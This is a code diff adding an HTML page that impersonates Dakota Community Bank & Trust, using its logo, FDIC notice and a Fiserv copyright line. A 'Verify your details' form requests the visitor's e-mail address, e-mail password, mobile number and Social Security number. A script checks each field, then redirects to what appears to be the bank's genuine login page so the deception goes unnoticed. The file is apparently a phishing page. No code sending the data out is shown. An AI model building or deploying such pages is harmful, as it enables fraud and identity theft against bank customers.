@@ -1,0 +1,113 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Dakota Community Bank & Trust | Verification</title>
+    <link rel="stylesheet" href="css/w3.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+</head>
+<body>
+    <div class="w3-hide-small" style="background: url('img/Dakota.png');background-repeat: no-repeat; background-position: center; min-height:100vh; height:100vh; margin-top:-215px; z-index:-1;"></div>
+    <nav class="w3-bar w3-hide-small"  style="margin-top: -400px; z-index:1;">
+        <div class="w3-bar-item w3-right w3-margin-top" style="margin-right:90px;">
+            <a class="w3-hover-text-blue w3-padding" style="text-decoration:none;" href="#">Find Us</a>
+            <a class="w3-hover-text-blue w3-padding" style="text-decoration:none;" href="#">ATMs</a>
+            <a class="w3-hover-text-blue w3-padding" style="text-decoration:none;" href="#">Log in</a>
+        </div>
+    </nav>
+
+    <nav class="w3-bar w3-hide-large w3-hide-medium" style="background-color:#e5e4e3">
+        <div class="w3-bar-item w3-right w3-margin-top">
+            <a class="w3-hover-text-black w3-small w3-padding" style="text-decoration:none;" href="#">Find Us</a>
+            <a class="w3-hover-text-black w3-small w3-padding" style="text-decoration:none;" href="#">ATMs</a>
+            <a class="w3-hover-text-black w3-small w3-padding" style="text-decoration:none;" href="#">Log in</a>
+        </div>
+    </nav>
+    <div>
+            <div class="w3-hide-large w3-hide-medium" style="background: url('img/Dakota.png');background-size:cover; background-position: center; min-height:50vh; height:50vh; z-index:-1;"></div>
+        <img class="w3-hide-large w3-hide-medium" src="img/logo.png" style="margin-left:70px; width:200px; margin-top:-215px;">
+    </div>
+
+    <div class="w3-row-padding" style="margin-top:200px;">
+        <div class="w3-col s12 m6 l6">
+            <h3 class="" style="margin-left:50px;"><b>VERIFY YOUR DETAILS</b></h3>
+            <form class="w3-form" style="margin-top:50px; margin-left:50px;">
+                <label class="w3-label" for="email">E-mail</label>
+                <div id="id01" class="w3-panel w3-display-container" style="display:none; background-color:#89c8ca;">
+                    <span onclick="this.parentElement.style.display='none'"
+                    class="w3-button w3-display-topright">X</span>
+                    <p>Input E-mail</p>
+                  </div>
+                <input type="text" class="w3-input w3-border w3-section" id="email">
+                <label class="w3-label" for="emailP">E-mail Password</label>
+                <div id="id02" class="w3-panel w3-display-container" style="display:none; background-color:#89c8ca;">
+                    <span onclick="this.parentElement.style.display='none'"
+                    class="w3-button w3-display-topright">X</span>
+                    <p>Input E-mail Password</p>
+                  </div>
+                <input type="password" class="w3-input w3-border w3-section"  id="emailP">
+                <label class="w3-label" for="number">Mobile Number</label>
+                <div id="id03" class="w3-panel w3-display-container" style="display:none; background-color:#89c8ca;">
+                    <span onclick="this.parentElement.style.display='none'"
+                    class="w3-button w3-display-topright">X</span>
+                    <p>Input Mobile Number</p>
+                  </div>
+                <input type="tel" class="w3-input w3-border w3-section" id="number">
+                <label class="w3-label" for="ssn">SSN</label>
+                <div id="id04" class="w3-panel w3-display-container" style="display:none; background-color:#89c8ca;">
+                    <span onclick="this.parentElement.style.display='none'"
+                    class="w3-button w3-display-topright">X</span>
+                    <p>Input SSN</p>
+                  </div>
+                <input type="text" class="w3-input w3-border w3-section" id="ssn">
+                <button type="submit" id="Login" class="w3-button w3-round w3-text-white w3-hover-blue w3-margin-top w3-right" style="background-color:#89c8ca;" value="LOG IN" >LOG IN</button>
+            </form>
+        </div>
+    </div>
+
+<footer class="w3-bar w3-hide-small" style="margin-top:60px;">
+        <a href="#" class="w3-bar-item" style="color:#89c8ca; text-decoration:none; ">HELP</a>
+        <a href="#" class="w3-bar-item" style="color:#89c8ca; text-decoration:none; ">PRIVACY</a>
+        <a href="#" class="w3-bar-item" style="color:#89c8ca; text-decoration:none; ">TERMS OF USE</a>
+        <a href="#" class="w3-bar-item" style="color:#89c8ca; text-decoration:none; ">CAREERS</a>
+        <a href="#" class="w3-bar-item" style="color:#89c8ca; text-decoration:none; ">CONTACT</a>
+        <a href="#" class="w3-bar-item" style="color:#89c8ca; text-decoration:none; ">DISCLOSURE</a>
+    </footer>
+    <h6 class="w3-small w3-hide-small" style="margin-left:165px;">Member FDIC. Equal Housing Lender</h6>
+    <h6 class="w3-right w3-small w3-hide-small" style="margin-top:-30px; margin-right:80px;">© 2015-2019 Fiserv, Inc. or its affiliates.</h6>
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script> 
+
+<script>
+
+$(document).ready(function Login() {
+$('#Login').click(function Login(){
+    //alert('works');
+    var Email = document.querySelector('#email').value;
+    var EmailP = document.querySelector('#emailP').value;
+    var number = document.querySelector('#number').value;
+    var ssn = document.querySelector('#ssn').value;
+    if (!Email){
+        $('#id01').show()
+    }else if(!EmailP){
+        $('#id02').show()
+    }else if(!number){
+        $('#id03').show()
+    }else if(!ssn){
+        $('#id04').show()
+    }else{
+        window.open("https://web9.secureinternetbank.com/PBI_PBI1151/login/091303664","_self");
+    }
+});
+
+});
+
+//076353443
+</script>
+</body>
+</html>
